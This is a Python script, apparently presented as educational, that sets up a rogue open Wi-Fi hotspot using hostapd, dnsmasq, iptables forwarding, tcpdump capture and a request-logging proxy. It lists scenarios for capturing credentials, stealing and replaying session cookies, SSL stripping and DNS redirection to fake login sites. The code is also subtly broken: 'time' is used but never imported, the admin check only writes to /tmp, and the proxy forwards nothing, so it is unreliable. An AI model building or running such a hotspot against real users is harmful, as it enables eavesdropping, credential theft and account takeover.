"""
Local Network Testing Setup - Educational Purposes Only
Setup script for creating controlled testing environment
"""

import subprocess
import sys
import os
import json
from typing import Dict, List

class LocalNetworkSetup:
    """
    Setup local network for testing session hijacking
    """
    
    def __init__(self):
        self.network_config = {}
        self.test_environment = {}
    
    def check_system_requirements(self) -> Dict:
        """
        Check if system meets requirements for local testing
        """
        requirements = {
            'python_version': sys.version_info >= (3, 7),
            'admin_privileges': self.check_admin_privileges(),
            'network_tools': self.check_network_tools(),
            'virtual_environment': self.check_virtual_environment()
        }
        
        return requirements
    
    def check_admin_privileges(self) -> bool:
        """
        Check if running with admin privileges
        """
        try:
            # Try to create a test file in system directory
            test_file = '/tmp/test_admin'
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
            return True
        except:
            return False
    
    def check_network_tools(self) -> Dict:
        """
        Check for required network tools
        """
        tools = {
            'ifconfig': self.check_command('ifconfig'),
            'iptables': self.check_command('iptables'),
            'tcpdump': self.check_command('tcpdump'),
            'hostapd': self.check_command('hostapd'),
            'dnsmasq': self.check_command('dnsmasq')
        }
        
        return tools
    
    def check_command(self, command: str) -> bool:
        """
        Check if command is available
        """
        try:
            subprocess.run([command, '--help'], 
                         capture_output=True, 
                         timeout=5)
            return True
        except:
            return False
    
    def check_virtual_environment(self) -> bool:
        """
        Check if running in virtual environment
        """
        return hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
    
    def setup_test_network(self) -> Dict:
        """
        Setup local test network
        """
        network_config = {
            'interface': 'wlan0',
            'ssid': 'Test_Hotspot',
            'channel': 6,
            'ip_range': '192.168.1.0/24',
            'gateway': '192.168.1.1',
            'dns': '8.8.8.8'
        }
        
        self.network_config = network_config
        
        # Create configuration files
        self.create_hostapd_config()
        self.create_dnsmasq_config()
        self.create_iptables_rules()
        
        return network_config
    
    def create_hostapd_config(self) -> str:
        """
        Create hostapd configuration for fake hotspot
        """
        config_content = f"""
# HostAPD Configuration for Test Hotspot
interface={self.network_config['interface']}
driver=nl80211
ssid={self.network_config['ssid']}
hw_mode=g
channel={self.network_config['channel']}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        config_path = '/tmp/hostapd.conf'
        with open(config_path, 'w') as f:
            f.write(config_content)
        
        return config_path
    
    def create_dnsmasq_config(self) -> str:
        """
        Create dnsmasq configuration for DHCP and DNS
        """
        config_content = f"""
# DNSMasq Configuration for Test Network
interface={self.network_config['interface']}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,{self.network_config['gateway']}
dhcp-option=6,{self.network_config['dns']}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
"""
        
        config_path = '/tmp/dnsmasq.conf'
        with open(config_path, 'w') as f:
            f.write(config_content)
        
        return config_path
    
    def create_iptables_rules(self) -> List[str]:
        """
        Create iptables rules for traffic forwarding
        """
        rules = [
            f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
            f"iptables -A FORWARD -i {self.network_config['interface']} -o eth0 -j ACCEPT",
            f"iptables -A FORWARD -i eth0 -o {self.network_config['interface']} -j ACCEPT"
        ]
        
        return rules
    
    def start_test_services(self) -> Dict:
        """
        Start test network services
        """
        services = {
            'hostapd': self.start_hostapd(),
            'dnsmasq': self.start_dnsmasq(),
            'packet_capture': self.start_packet_capture(),
            'web_proxy': self.start_web_proxy()
        }
        
        return services
    
    def start_hostapd(self) -> Dict:
        """
        Start hostapd service
        """
        try:
            config_path = '/tmp/hostapd.conf'
            process = subprocess.Popen(
                ['hostapd', config_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return {
                'status': 'running',
                'pid': process.pid,
                'config': config_path
            }
        except Exception as e:
            return {
                'status': 'failed',
                'error': str(e)
            }
    
    def start_dnsmasq(self) -> Dict:
        """
        Start dnsmasq service
        """
        try:
            config_path = '/tmp/dnsmasq.conf'
            process = subprocess.Popen(
                ['dnsmasq', '-C', config_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return {
                'status': 'running',
                'pid': process.pid,
                'config': config_path
            }
        except Exception as e:
            return {
                'status': 'failed',
                'error': str(e)
            }
    
    def start_packet_capture(self) -> Dict:
        """
        Start packet capture for traffic analysis
        """
        try:
            interface = self.network_config['interface']
            output_file = '/tmp/captured_traffic.pcap'
            
            process = subprocess.Popen(
                ['tcpdump', '-i', interface, '-w', output_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return {
                'status': 'running',
                'pid': process.pid,
                'output_file': output_file,
                'interface': interface
            }
        except Exception as e:
            return {
                'status': 'failed',
                'error': str(e)
            }
    
    def start_web_proxy(self) -> Dict:
        """
        Start web proxy for traffic interception
        """
        try:
            # Simple Python HTTP proxy
            proxy_script = self.create_proxy_script()
            
            process = subprocess.Popen(
                [sys.executable, proxy_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return {
                'status': 'running',
                'pid': process.pid,
                'port': 8080,
                'script': proxy_script
            }
        except Exception as e:
            return {
                'status': 'failed',
                'error': str(e)
            }
    
    def create_proxy_script(self) -> str:
        """
        Create simple HTTP proxy script
        """
        proxy_code = '''
import socket
import threading
import time

def handle_client(client_socket):
    try:
        request = client_socket.recv(4096)
        print(f"Intercepted request: {request[:200]}")
        
        # Forward request to actual server
        # This is a simplified proxy for testing
        
        client_socket.close()
    except:
        pass

def start_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 8080))
    server.listen(5)
    
    print("Proxy running on port 8080")
    
    while True:
        client, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    start_proxy()
'''
        
        script_path = '/tmp/test_proxy.py'
        with open(script_path, 'w') as f:
            f.write(proxy_code)
        
        return script_path
    
    def create_test_scenarios(self) -> Dict:
        """
        Create test scenarios for session hijacking
        """
        scenarios = {
            'basic_interception': {
                'description': 'Basic HTTP traffic interception',
                'steps': [
                    'Connect to test hotspot',
                    'Visit HTTP website',
                    'Enter test credentials',
                    'Capture traffic'
                ],
                'expected_result': 'Credentials captured in plain text'
            },
            'session_hijacking': {
                'description': 'Session cookie theft and replay',
                'steps': [
                    'Login to test application',
                    'Capture session cookies',
                    'Replay session in different browser',
                    'Verify access granted'
                ],
                'expected_result': 'Full session access without login'
            },
            'ssl_stripping': {
                'description': 'HTTPS to HTTP downgrade',
                'steps': [
                    'Visit HTTPS website',
                    'Intercept and modify traffic',
                    'Serve HTTP version',
                    'Capture credentials'
                ],
                'expected_result': 'HTTPS downgraded to HTTP'
            },
            'dns_poisoning': {
                'description': 'DNS cache poisoning attack',
                'steps': [
                    'Modify DNS responses',
                    'Redirect to fake site',
                    'Capture login credentials',
                    'Verify redirection success'
                ],
                'expected_result': 'Victim redirected to fake site'
            }
        }
        
        return scenarios
    
    def generate_setup_report(self) -> str:
        """
        Generate setup report
        """
        report = f"""
# Local Network Testing Setup Report

## System Requirements Check
- **Python Version**: {'✅' if sys.version_info >= (3, 7) else '❌'}
- **Admin Privileges**: {'✅' if self.check_admin_privileges() else '❌'}
- **Network Tools**: {sum(self.check_network_tools().values())}/{len(self.check_network_tools())} available

## Network Configuration
- **Interface**: {self.network_config.get('interface', 'N/A')}
- **SSID**: {self.network_config.get('ssid', 'N/A')}
- **IP Range**: {self.network_config.get('ip_range', 'N/A')}
- **Gateway**: {self.network_config.get('gateway', 'N/A')}

## Test Scenarios Available
{chr(10).join(f"- {scenario['description']}" for scenario in self.create_test_scenarios().values())}

## Usage Instructions

1. **Setup Environment**:
   ```bash
   sudo python3 setup_local_network.py
   ```

2. **Start Test Network**:
   ```bash
   sudo python3 start_test_services.py
   ```

3. **Run Test Scenarios**:
   ```bash
   python3 local_hotspot_test.py
   ```

4. **Cleanup**:
   ```bash
   sudo python3 cleanup_test_environment.py
   ```

## Safety Notes
- **Local testing only**
- **No external connections**
- **Controlled environment**
- **Educational purposes**

---
*Setup completed: {time.strftime('%Y-%m-%d %H:%M:%S')}*
        """
        
        return report

# Main setup function
def main():
    """
    Main setup function
    """
    print("🔧 Setting up Local Network Testing Environment...")
    
    setup = LocalNetworkSetup()
    
    # Check requirements
    requirements = setup.check_system_requirements()
    print(f"✅ System requirements check: {sum(requirements.values())}/{len(requirements)} passed")
    
    # Setup network
    network_config = setup.setup_test_network()
    print(f"✅ Network configured: {network_config['ssid']}")
    
    # Create test scenarios
    scenarios = setup.create_test_scenarios()
    print(f"✅ Test scenarios created: {len(scenarios)} scenarios")
    
    # Generate report
    report = setup.generate_setup_report()
    print("\n" + report)
    
    print("\n🚀 Setup complete! Ready for local testing.")

if __name__ == "__main__":
    main() 